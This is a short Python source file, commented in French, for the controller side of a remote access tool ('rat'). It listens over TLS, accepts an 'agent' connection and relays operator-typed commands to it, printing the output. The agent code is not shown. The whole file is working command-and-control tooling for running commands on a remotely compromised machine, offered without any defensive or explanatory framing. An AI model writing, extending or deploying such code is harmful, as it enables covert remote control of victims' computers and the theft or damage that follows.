import socket
import ssl
import os
from dotenv import load_dotenv

SERVER_PORT = 8888

load_dotenv()
ip_server = os.getenv('IP_SERVER')

# Créer un contexte SSL
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((ip_server, SERVER_PORT))
server_socket.listen(1)
print(f"[*] Listening on {SERVER_PORT}...")

# Envelopper le socket avec SSL
with context.wrap_socket(server_socket, server_side=True) as ssl_socket:
    client_socket, client_address = ssl_socket.accept()
    print("[+] Agent received !")

    while True:
        command = input("rat > ")
        if command.lower() == 'exit':
            client_socket.send(b'exit')
            break
        client_socket.send(command.encode())
        result = client_socket.recv(1024).decode()
        print(result)

    client_socket.close()
server_socket.close()
